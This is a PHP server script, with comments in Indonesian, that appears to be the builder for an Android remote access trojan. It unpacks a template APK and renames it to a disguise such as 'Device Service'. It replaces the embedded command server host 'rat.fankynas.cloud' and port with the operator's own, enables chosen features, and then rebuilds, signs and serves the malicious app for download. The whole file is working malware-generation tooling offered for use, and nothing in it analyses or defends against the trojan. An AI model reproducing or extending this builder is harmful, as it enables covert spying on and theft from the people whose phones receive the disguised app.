<?php
header('Content-Type: application/json');
require_once '../includes/config.php';

function writeLog($msg) {
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents(LOG_FILE, "[$timestamp] $msg\n", FILE_APPEND);
}

try {
    $appName = $_POST['appName'] ?? 'Device Service';
    $packageName = $_POST['packageName'] ?? 'com.servicevip.app';
    $serverUrl = $_POST['serverUrl'] ?? DEFAULT_SERVER;
    $port = $_POST['port'] ?? DEFAULT_PORT;
    $features = $_POST['features'] ?? [];
    $iconUrl = $_POST['iconUrl'] ?? '';
    
    // Validasi
    if (!preg_match('/^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/i', $packageName)) {
        throw new Exception('Package name tidak valid');
    }
    
    // Buat unique ID untuk session build
    $buildId = uniqid('build_');
    $workDir = WORKSPACE_DIR . $buildId . '/';
    mkdir($workDir, 0777, true);
    
    writeLog("Starting build $buildId | Package: $packageName | Server: $serverUrl:$port");
    
    // 1. Extract base APK template
    $zip = new ZipArchive();
    if ($zip->open(TEMPLATE_APK) !== true) {
        throw new Exception('Template APK tidak ditemukan');
    }
    $zip->extractTo($workDir);
    $zip->close();
    
    // 2. Modify AndroidManifest.xml
    $manifestPath = $workDir . 'AndroidManifest.xml';
    if (file_exists($manifestPath)) {
        $manifest = file_get_contents($manifestPath);
        $manifest = preg_replace('/package="[^"]+"/', 'package="' . $packageName . '"', $manifest);
        $manifest = preg_replace('/<application[^>]+>/', '<application android:label="' . $appName . '" android:icon="@mipmap/ic_launcher">', $manifest);
        file_put_contents($manifestPath, $manifest);
        writeLog("Modified AndroidManifest.xml");
    }
    
    // 3. Update konfigurasi di smali files (modifikasi config.smali)
    $smaliFiles = glob($workDir . 'smali/com/servicevip/app/*.smali');
    foreach ($smaliFiles as $smali) {
        $content = file_get_contents($smali);
        $content = str_replace('rat.fankynas.cloud', $serverUrl, $content);
        $content = str_replace('8080', (string)$port, $content);
        file_put_contents($smali, $content);
    }
    
    // 4. Tambah/remove fitur berdasarkan pilihan user
    $featuresXml = $workDir . 'res/values/features.xml';
    $featuresContent = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<resources>\n";
    foreach ($features as $feature) {
        $featuresContent .= "    <bool name=\"feature_$feature\">true</bool>\n";
    }
    $featuresContent .= "</resources>";
    file_put_contents($featuresXml, $featuresContent);
    writeLog("Features configured: " . implode(', ', $features));
    
    // 5. Download dan ganti icon jika URL diberikan
    if ($iconUrl && filter_var($iconUrl, FILTER_VALIDATE_URL)) {
        $iconData = file_get_contents($iconUrl);
        if ($iconData) {
            file_put_contents($workDir . 'res/drawable/ic_launcher.png', $iconData);
            file_put_contents($workDir . 'res/drawable/ic_launcher_round.png', $iconData);
            writeLog("Custom icon downloaded from $iconUrl");
        }
    }
    
    // 6. Rebuild APK dengan aapt
    $outputApk = OUTPUT_DIR . $buildId . '.apk';
    $cmd = AAPT_PATH . ' package -f -M ' . escapeshellarg($workDir . 'AndroidManifest.xml') .
           ' -S ' . escapeshellarg($workDir . 'res') .
           ' -I /usr/local/android-sdk/platforms/android-35/android.jar' .
           ' -F ' . escapeshellarg($outputApk) .
           ' ' . escapeshellarg($workDir);
    
    exec($cmd . ' 2>&1', $output, $returnCode);
    
    if ($returnCode !== 0) {
        throw new Exception('AAPT build failed: ' . implode("\n", $output));
    }
    
    // 7. Sign APK dengan apksigner
    $signCmd = APKSIGNER_PATH . ' sign --ks ' . escapeshellarg(KEYSTORE_PATH) .
               ' --ks-pass pass:' . KEYSTORE_PASS .
               ' --key-pass pass:' . KEY_PASS .
               ' --ks-key-alias ' . KEY_ALIAS .
               ' ' . escapeshellarg($outputApk);
    
    exec($signCmd . ' 2>&1', $signOutput, $signReturn);
    
    if ($signReturn !== 0) {
        throw new Exception('Signing failed: ' . implode("\n", $signOutput));
    }
    
    // 8. Zipalign
    $alignedApk = OUTPUT_DIR . $buildId . '_aligned.apk';
    $alignCmd = ZIPALIGN_PATH . ' -p -f -v 4 ' . escapeshellarg($outputApk) . ' ' . escapeshellarg($alignedApk);
    exec($alignCmd);
    rename($alignedApk, $outputApk);
    
    writeLog("Build successful: $outputApk");
    
    // 9. Cleanup temporary workspace
    array_map('unlink', glob("$workDir/*.*"));
    rmdir($workDir);
    
    // 10. Return download URL
    echo json_encode([
        'success' => true,
        'download_url' => '/builder/output/' . $buildId . '.apk',
        'filename' => $appName . '_' . date('Ymd_His') . '.apk'
    ]);
    
} catch (Exception $e) {
    writeLog("ERROR: " . $e->getMessage());
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}
?>
